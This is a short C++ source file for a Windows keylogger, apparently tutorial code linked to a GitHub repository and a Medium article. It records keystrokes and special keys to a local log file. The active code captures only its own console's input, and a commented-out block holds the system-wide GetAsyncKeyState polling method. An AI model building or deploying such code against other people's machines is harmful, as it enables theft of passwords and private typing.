/*
https://github.com/shv-om/keylogger/blob/main/key.cpp
https://shv-om.medium.com/building-keyloggers-using-c-57caf0603528

g++ keylogger_01.cpp -o keylogger_01.exe
*/
#include <iostream>     // input-output stream
#include <windows.h>    // importing windows function
#include <conio.h>      // console input-output
#include <fstream>      // file input-output streamusing namespace std;
using namespace std;

int keys(char key, fstream&);

int main(){

  char key_press;
  int ascii_value;

  fstream afile;

  afile.open("key_file_01.log", ios::in | ios::out);
  afile.close();

  while(true){

    /* Block 1 Starts */
    key_press = getch();	// capture the keystrokes
    ascii_value = key_press;
    cout << "Here --> " << key_press << endl;
    // cout << "Async --> " << ascii_value << endl;
    if(7 < ascii_value && ascii_value < 256){
      keys(key_press, afile);
    }
    /* Block 1 Ends */


    /* Block 2 Starts */

    // for(int i=8; i<256; i++){	//Windows method
    //   if(GetAsyncKeyState(i) == -32767){	
    //     keys(i, afile);
    //   }
    // }

    /* Block 2 Ends */
  }
  return 0;
}

int keys(char key, fstream& file){

  file.open("key_file_01.log", ios::app | ios::in | ios::out);
  if(file){
    if(GetAsyncKeyState(VK_SHIFT)){
      file << "[SHIFT]";
    }
    else if(GetAsyncKeyState(VK_ESCAPE)){
      file << "[ESCAPE]";
    }
    else if(GetAsyncKeyState(VK_RETURN)){
      file << "[ENTER]";
    }
    else if(GetAsyncKeyState(VK_CONTROL)){
      file << "[CONTROL]";
    }
    else if(GetAsyncKeyState(VK_MENU)){
      file << "[ALT]";
    }
    else if(GetAsyncKeyState(VK_DELETE)){
      file << "[DELETE]";
    }
    else if(GetAsyncKeyState(VK_TAB)){
      file << "[TAB]";
    }
    else if(GetAsyncKeyState(VK_BACK)){
      file << "[BACKSPACE]";
    }
    else{
      file << key;
    }
  }

  file.close();

  return 0;
}